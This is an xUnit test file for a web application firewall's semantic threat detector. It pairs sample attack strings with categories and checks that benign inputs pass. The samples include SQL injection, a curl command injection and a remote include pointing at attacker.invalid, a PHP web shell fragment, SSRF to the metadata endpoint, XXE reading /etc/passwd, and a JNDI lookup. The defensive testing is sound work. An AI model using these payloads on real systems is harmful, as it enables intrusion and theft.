using LyWaf.Services.Protect;
using Microsoft.AspNetCore.Http;
using Xunit;

namespace LyWaf.Tests;

public sealed class SemanticThreatDetectorTests
{
    private readonly SemanticThreatDetector _detector = new();

    public static TheoryData<string, string, string> AttackSamples => new()
    {
        { "query", "' OR 1=1", "SQL注入" },
        { "query", "1 UNION ALL SELECT password FROM users", "SQL注入" },
        { "body", "; curl http://attacker.invalid/a", "命令注入" },
        { "body", "<?php system($_GET[x]);", "代码注入" },
        { "query", "gopher://127.0.0.1:6379/_PING", "SSRF" },
        { "query", "http://169.254.169.254/latest/meta-data/", "SSRF" },
        { "body", """<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>""", "XXE" },
        { "path", "/../../../../etc/passwd", "路径穿越" },
        { "query", "/proc/self/environ", "本地文件包含" },
        { "body", "include(http://attacker.invalid/x.php)", "远程文件包含" },
        { "body", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "Java反序列化" },
        { "body", """O:8:"Exploit":1:{s:1:"x";s:1:"y";}""", "PHP反序列化" },
        { "body", "System.Runtime.Serialization.ObjectManager", ".NET反序列化" },
        { "body", """{"$where":"this.password == 'x'"}""", "NoSQL注入" },
        { "query", "*)(|(uid=*))", "LDAP注入" },
        { "query", "' or '1'='1", "XPath注入" },
        { "body", "{{ 7 * 7 }}", "模板/表达式注入" },
        { "header", "${jndi:ldap://attacker.invalid/a}", "模板/表达式注入" },
    };

    [Theory]
    [MemberData(nameof(AttackSamples))]
    public void ClassifiesAttackSamples(string source, string value, string expectedCategory)
    {
        var finding = _detector.Detect(Snapshot(source, value),
            source == "path" ? new PathString(value) : new PathString("/"));

        Assert.NotNull(finding);
        Assert.Equal(expectedCategory, finding.Category);
        Assert.StartsWith("semantic-", finding.RuleId);
        Assert.True(finding.Evidence.Length <= 160);
    }

    [Theory]
    [InlineData("select a delivery option")]
    [InlineData("This article explains union membership")]
    [InlineData("https://example.com/callback")]
    [InlineData("user@example.com")]
    [InlineData("""{"filter":{"status":"active"}}""")]
    [InlineData("/products/2026/summary")]
    public void DoesNotClassifyRepresentativeBenignValues(string value)
    {
        Assert.Null(_detector.Detect(Snapshot("body", value), new PathString("/")));
    }

    private static RequestInspectionSnapshot Snapshot(string source, string value) => new(
        source == "query" ? [value] : [],
        source == "header" ? [value] : [],
        source == "body" ? [value] : [],
        false,
        []);
}
